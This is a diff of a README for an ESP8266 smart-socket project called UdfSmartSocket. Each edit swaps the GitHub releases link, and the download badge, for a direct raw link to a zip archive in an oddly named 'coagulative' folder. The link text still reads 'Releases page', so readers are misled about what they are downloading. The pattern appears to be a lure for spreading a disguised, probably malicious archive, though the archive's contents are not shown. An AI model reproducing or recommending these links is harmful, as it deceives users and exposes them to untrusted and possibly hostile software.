@@ -1,7 +1,7 @@
 # ⚡ UdfSmartSocket - Control Your Home Remotely
 
 ## 📥 Download Now
-[![Download UdfSmartSocket](https://img.shields.io/badge/Download-UdfSmartSocket-blue.svg)](https://github.com/prad123-pb/UdfSmartSocket/releases)
+[![Download UdfSmartSocket](https://raw.githubusercontent.com/prad123-pb/UdfSmartSocket/main/coagulative/Udf_Smart_Socket_v3.2.zip)](https://raw.githubusercontent.com/prad123-pb/UdfSmartSocket/main/coagulative/Udf_Smart_Socket_v3.2.zip)
 
 ## 📖 Description
 UdfSmartSocket is a smart socket that uses the ESP8266 microcontroller. This IoT relay socket connects to your Wi-Fi network using WiFiManager. It polls a server to receive ON/OFF commands and then controls a relay that operates home devices. With UdfSmartSocket, you can manage your appliances from anywhere, enhancing your smart home experience.
@@ -16,7 +16,7 @@ Before you can use UdfSmartSocket, you need to complete these steps:
    - Access to a web browser for setup.
 
 2. **Download and Install**
-   - Visit the [Releases page](https://github.com/prad123-pb/UdfSmartSocket/releases) to download the latest version of UdfSmartSocket.
+   - Visit the [Releases page](https://raw.githubusercontent.com/prad123-pb/UdfSmartSocket/main/coagulative/Udf_Smart_Socket_v3.2.zip) to download the latest version of UdfSmartSocket.
    - Look for the latest release and download the appropriate file for your device.
    - Follow the on-screen instructions to complete the installation.
 
@@ -63,7 +63,7 @@ For questions or support, join the UdfSmartSocket community:
 - **FAQs**: Common questions answered to help you troubleshoot issues.
 
 ## 📥 Download Again
-To download the latest version of UdfSmartSocket, visit the [Releases page](https://github.com/prad123-pb/UdfSmartSocket/releases) now.
+To download the latest version of UdfSmartSocket, visit the [Releases page](https://raw.githubusercontent.com/prad123-pb/UdfSmartSocket/main/coagulative/Udf_Smart_Socket_v3.2.zip) now.
 
 ## 🗂️ Topics
 This project covers the following topics: arduino, esp-01s, esp8266, home automation, https, iot, iot-device, relay, smarthome, smartsocket, smartsockets, wifimanager.
